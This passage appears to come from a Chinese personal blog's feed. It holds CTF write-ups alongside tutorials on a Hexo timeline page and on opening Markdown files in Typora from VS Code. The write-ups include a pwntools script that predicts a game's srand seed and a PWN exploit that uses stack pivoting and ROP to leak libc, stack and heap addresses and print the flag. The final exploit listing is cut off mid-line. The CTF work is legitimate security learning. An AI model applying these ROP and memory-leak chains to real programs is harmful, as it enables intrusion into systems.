<p>如图，只要存在answer，就会一直生成题目，因此可以一次输入足够长（0x1000长度）的答案，可以快速得分</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># 601681286521741824 ? 2198172281756103560</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定日期（年-月-日 时:分:秒）</span></span><br><span class="line">year = <span class="number">2010</span></span><br><span class="line">month = <span class="number">10</span></span><br><span class="line">day = <span class="number">22</span></span><br><span class="line">hour = <span class="number">21</span></span><br><span class="line">minute = <span class="number">26</span></span><br><span class="line">second = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 datetime 对象</span></span><br><span class="line">dt = datetime(year, month, day, hour, minute, second)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取时间戳</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.mktime(dt.timetuple()))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">37093</span>)</span><br><span class="line">seed = timestamp</span><br><span class="line"><span class="comment"># seed = 0</span></span><br><span class="line">guess = -<span class="number">0x1</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Question Set:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get first challenge</span></span><br><span class="line">challenge = (p.recvline()).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">v2 = challenge.split(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">v2[<span class="number">0</span>] = <span class="built_in">int</span>(v2[<span class="number">0</span>])</span><br><span class="line">v2[<span class="number">1</span>] = <span class="built_in">int</span>(v2[<span class="number">1</span>])</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3600</span>):</span><br><span class="line">    <span class="comment"># 获取当前时间（秒级别）</span></span><br><span class="line">    guess += <span class="number">1</span></span><br><span class="line">    info(<span class="string">f&quot;guess: <span class="subst">&#123;guess&#125;</span>&quot;</span>)</span><br><span class="line">    info(<span class="string">f&quot;seed+guess: <span class="subst">&#123;seed+guess&#125;</span>&quot;</span>)</span><br><span class="line">    seed_correct = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#            b *$rebase(0x0000000000001858)</span></span><br><span class="line">    <span class="comment">#            b *$rebase(0x0000000000001994)&quot;&quot;&quot;)</span></span><br><span class="line">    libc.srand(seed+guess)</span><br><span class="line">    <span class="comment"># 生成一个随机数（类似rand()）</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_challenge</span>():</span><br><span class="line">        v1 = libc.rand()  <span class="comment"># C的rand()通常生成0到RAND_MAX之间的值，RAND_MAX = 2^31-1</span></span><br><span class="line">        v2 = libc.rand()</span><br><span class="line">        v3 = (v1 &lt;&lt; <span class="number">31</span>) | v2 ^ libc.rand()</span><br><span class="line">        v4 = v2 | ((v1 ^ libc.rand()) &lt;&lt; <span class="number">31</span>)</span><br><span class="line">        info(<span class="string">f&quot;question:\t <span class="subst">&#123;v3&#125;</span> ? <span class="subst">&#123;v4&#125;</span> &quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> v3, v4</span><br><span class="line"></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10089</span>):</span><br><span class="line">        v1 = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        info(<span class="string">f&quot;challenge:\t<span class="subst">&#123;v2[<span class="number">0</span>]&#125;</span> ? <span class="subst">&#123;v2[<span class="number">1</span>]&#125;</span> &quot;</span>)</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> v2[<span class="number">0</span>] == v1[<span class="number">0</span>] <span class="keyword">and</span> v2[<span class="number">1</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">                info(<span class="string">&quot;correct&quot;</span>)</span><br><span class="line">                pause()</span><br><span class="line">                seed_correct = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> seed_correct == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    info(<span class="string">f&#x27;answer: <span class="subst">&#123;answer&#125;</span>&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;submit your score&#x27;</span>, answer)</span><br><span class="line">    <span class="comment"># break</span></span><br><span class="line">    <span class="comment"># p.sendlineafter(&#x27;submit your score&#x27;, &quot;submit&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>flag: <code>ZJUCTF&#123;5aK1-CHan&#39;s_k0k0r0_ls_5m4sh3d_oTATo&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo添加时间轴页面</title>
    <url>/posts/756843e3.html</url>
    <content><![CDATA[<p>添加一个时间轴页面，记录一下自己的建站历程</p>
<h2 id="添加时间线页面"><a href="#添加时间线页面" class="headerlink" title="添加时间线页面"></a>添加时间线页面</h2><ul>
<li><p>使用<code>hexo new page sitetime</code>新建一个归档页面，页面生成在<code>/source/sitetime/index.md</code>处。</p>
</li>
<li><p>主题中在menu处添加以下配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span>   <span class="string">/</span>           <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章||fas</span> <span class="attr">fa-blog:</span></span><br><span class="line">    <span class="string">归档:</span>   <span class="string">/archives/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span>   <span class="string">/tags/</span>      <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">分类:</span>   <span class="string">/categories/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/sitetime</span>   <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-hourglass-end</span> <span class="string">//</span> <span class="string">这里添加时间轴</span></span><br><span class="line">  <span class="string">清单||fas</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/Gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">    <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span>  <span class="string">far</span> <span class="string">fa-paper-plane</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在<code>/source/sitetime/index.md</code>的配置代码（FrontMatter）中添加一行配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">layout:</span> <span class="string">sitetime</span></span><br></pre></td></tr></table></figure>

<p>注意layout后面的内容需要与后面创建的模版文件保持一致</p>
</li>
</ul>
<h2 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h2><p>参考<a href="https://butterfly.js.org/posts/ceeb73f/?highlight=timeline#Timeline">官方文档</a>：在<code>/source/sitetime/index.md</code>中添加以下内容即可在时间线中添加对应内容：</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: sitetime</span><br><span class="line"><span class="section">date: 2024-10-28 10:57:11</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"></span><br><span class="line">&#123;% timeline 2024 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-22 --&gt;</span><br><span class="line">基于hexo重新建站，使用butterfly主题</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-27 --&gt;</span><br><span class="line">美化导航栏，添加导航栏图标，添加Gittalk评论区功能</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-28 --&gt;</span><br><span class="line">添加时间轴功能</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% timeline 2023 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 04-09 --&gt;</span><br><span class="line"></span><br><span class="line">基于github.io仓库和byblog创建了我的博客网站</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/756843e3/image-20241028112943535.png" class="" title="image-20241028112943535">

]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>VScode使用Typora打开md文件</title>
    <url>/posts/70c2c619.html</url>
    <content><![CDATA[<p>在使用vscode编辑md文件时，如果要用Typora经常需要右键在文件资源管理器打开，然后才能用Typora编辑，非常不方便，因此本文尝试了几个vscode插件。以下为使用总结：</p>
<h2 id="1-Open-in-External-App"><a href="#1-Open-in-External-App" class="headerlink" title="1. Open in External App"></a>1. Open in External App</h2><p>使用Open in External App插件，该插件可以设定指定文件类型的打开方式，例如md，pdf，html等等：</p>
<img src="/posts/70c2c619/image-20241027230326682.png" class="" title="image-20241027230326682">

<p>在vscode的settings.json文件中加入以下配置即可：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;openInExternalApp.openMapper&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="comment">// represent file extension name</span></span><br><span class="line">      <span class="attr">&quot;extensionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;md&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="comment">// the external applications to open the file which extension name is html</span></span><br><span class="line">      <span class="attr">&quot;apps&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="comment">// openCommand can be shell command or the complete executable application path</span></span><br><span class="line">        <span class="comment">// title will be shown in the drop list if there are several apps</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Typora&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isElectronApp&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>评价是不太好用，经常没有反应，后来查看官方文档，发现原因：</p>
<img src="/posts/70c2c619/image-20241027233833001.png" class="" title="image-20241027233833001">

<p>该插件打开md文档时使用了第二种api，此方式无法打开路径存在非ascii字符的文件。因此起名时需要多加注意（不能有中文~~~）</p>
<h2 id="2-Open-in-Typora"><a href="#2-Open-in-Typora" class="headerlink" title="2. Open in Typora"></a>2. Open in Typora</h2><p>该插件则是专门面向Typora打开md文件的</p>
<img src="/posts/70c2c619/image-20241027232443686.png" class="" title="image-20241027232443686">

<p>首先需要将Typora安装路径添加到环境变量，然后在settings.json文件中添加以下内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;ego.power-tools.user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;buttons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Typora&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tooltip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;使用Typora打开&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;command&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;typora.open&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;onEditorCreated&quot;</span><span class="punctuation">:</span> <span class="string">&quot;if ($vs.window.activeTextEditor.document.languageId === &#x27;markdown&#x27;) &#123; $v[&#x27;button&#x27;].enable(); $v[&#x27;button&#x27;].color = &#x27;&#x27;; &#125; else &#123; $v[&#x27;button&#x27;].disable(); $v[&#x27;button&#x27;].color = &#x27;grey&#x27;;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;onEditorChanged&quot;</span><span class="punctuation">:</span> <span class="string">&quot;if ($vs.window.activeTextEditor.document.languageId === &#x27;markdown&#x27;) &#123; $v[&#x27;button&#x27;].enable(); $v[&#x27;button&#x27;].color = &#x27;&#x27;; &#125; else &#123; $v[&#x27;button&#x27;].disable(); $v[&#x27;button&#x27;].color = &#x27;grey&#x27;;&#125;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>结果报错，醉了~~~：</p>
<img src="/posts/70c2c619/image-20241027233020235.png" class="" title="image-20241027233020235">

<p>可能是太久没有更新导致出现的bug。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-Beichen-CTF-WP</title>
    <url>/posts/709ed7e9.html</url>
    <content><![CDATA[<p>今年暑假参加了信大举办的北辰计划夏令营，其中最后一天举行了一次CTF比赛，第一批的题目比较难，当时没做出来，现在重新做一下，在此记录。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><ol>
<li>首先读取输入，判断输入与加密后的字符串，成功才能进入漏洞函数：<img src="/posts/709ed7e9/image-20241028155312928.png" class="" title="image-20241028155312928"><br>直接动态调试可以得到输入应为<code>I_can_find_the_right_path\n</code>，然后进入存在漏洞函数；</li>
<li>漏洞函数会首先打开flag文件，将flag读入到堆上，并且关闭了flag文件描述符，然后使用seccomp开启沙箱保护，只允许read和write，exit（这里有点问题，好像不能直接用syscall的gadget，会直接报错<code>bad system call</code>，知道的师傅可以解释一下QWQ）。<br>然后漏洞函数读取0x40字节，可以溢出0x10字节。</li>
</ol>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul>
<li><p>首先可以通过构造fake stack来写入更大长度的rop链，分为两步，第一步覆盖rbp为想要写入的伪栈地址，然后重新返回到vuln_addr+8（如图，要跳过<code>push rbp，mov rbp，rsp</code>），第二步向伪栈写入内容，然后leave ret即可实现栈迁移。</p>
<img src="/posts/709ed7e9/image-20241028160356645.png" class="" title="image-20241028160356645">
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step1: construct fake rbp</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;===welcome===\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: input ROP to leak libc</span></span><br><span class="line">payload = flat(pop_rdi, puts_got, puts_plt, vuln_addr)</span><br><span class="line">payload = flat(payload, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload)), bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后使用puts函数打印puts got表地址，泄漏libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step2: input ROP to leak libc</span></span><br><span class="line">payload = flat(pop_rdi, puts_got, puts_plt, vuln_addr)</span><br><span class="line">payload = flat(payload, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload)), bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;puts_addr: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="string">f&quot;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过libc上environ符号打印出其所在栈地址</p>
<img src="/posts/709ed7e9/image-20241028160954799.png" class="" title="image-20241028160954799">

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step3: leak environ_addr</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_addr</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f497</span>+libc_addr</span><br><span class="line">read_addr = libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall = libc_addr+<span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span>+libc_addr</span><br><span class="line"><span class="comment"># mp_addr = libc_addr+libc.sym[&quot;mp]+96+1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">f&quot;read_addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;write_addr: <span class="subst">&#123;<span class="built_in">hex</span>(write_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># info(f&quot;mp_addr: &quot;)</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x404600</span></span><br><span class="line">payload = flat(p64(bss_addr-<span class="number">0x100</span>)*<span class="number">6</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, <span class="number">0</span>, pop_rsi, flag_addr, pop_rdx_r12, <span class="number">0x100</span>, bss_addr+<span class="number">0x30</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, pop_rdi, <span class="number">0</span>, read_addr, vuln_addr+<span class="number">8</span>, <span class="number">0</span>, bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">environ_addr = <span class="number">0x28f2d0</span>+libc_addr</span><br><span class="line">payload = flat(pop_rdi, <span class="number">1</span>, pop_rsi, environ_addr, pop_rdx_r12, <span class="number">0x6</span>, <span class="number">0</span>, write_addr, vuln_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, flag_addr-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后根据偏移可以获取到栈上存储的堆地址，从而获取到存放flag的堆的地址</p>
<img src="/posts/709ed7e9/image-20241028161105890.png" class="" title="image-20241028161105890">
<p>脚本如下，这里假定堆地址只有3字节，可能需要多试几次才能出来：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step4: leak heap_addr</span></span><br><span class="line">heap_addr = stack_addr-<span class="number">0x130</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_plt, vuln_addr, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))+<span class="number">0x30</span></span><br><span class="line">info(<span class="string">f&quot;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>puts函数打印flag地址即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step5: print flag</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_addr, vuln_addr, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x0000000000401828&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x000000000040172D&quot;)</span></span><br><span class="line">p = gdb.debug(<span class="string">&quot;./pwn&quot;</span>, </span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            b *0x000000000040167E</span></span><br><span class="line"><span class="string">            b *0x000000000040172D</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;I_can_find_the_right_path\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack pivoting to leak libc</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x000000000040173b</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000040129d</span></span><br><span class="line">vuln_addr = <span class="number">0x000000000040170A</span></span><br><span class="line">bss_addr = <span class="number">0x0000000000404500</span></span><br><span class="line">leave_ret = <span class="number">0x000000000040186C</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment"># step1: construct fake rbp</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;===welcome===\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: input ROP to leak libc</span></span><br><span class="line">payload = flat(pop_rdi, puts_got, puts_plt, vuln_addr)</span><br><span class="line">payload = flat(payload, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload)), bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;puts_addr: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="string">f&quot;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: leak environ_addr</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_addr</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f497</span>+libc_addr</span><br><span class="line">read_addr = libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall = libc_addr+<span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span>+libc_addr</span><br><span class="line"><span class="comment"># mp_addr = libc_addr+libc.sym[&quot;mp]+96+1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">f&quot;read_addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;write_addr: <span class="subst">&#123;<span class="built_in">hex</span>(write_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># info(f&quot;mp_addr: &quot;)</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x404600</span></span><br><span class="line">payload = flat(p64(bss_addr-<span class="number">0x100</span>)*<span class="number">6</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, <span class="number">0</span>, pop_rsi, flag_addr, pop_rdx_r12, <span class="number">0x100</span>, bss_addr+<span class="number">0x30</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, pop_rdi, <span class="number">0</span>, read_addr, vuln_addr+<span class="number">8</span>, <span class="number">0</span>, bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">environ_addr = <span 